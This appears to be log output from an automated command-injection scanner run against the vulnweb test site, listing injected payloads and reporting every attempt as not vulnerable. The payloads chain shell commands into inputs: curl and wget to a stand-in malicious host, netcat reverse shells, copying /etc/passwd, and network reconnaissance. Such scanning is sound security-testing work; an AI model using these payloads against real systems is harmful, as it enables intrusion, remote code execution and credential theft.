+URL: http://testasp.vulnweb.com/, Payload: | curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
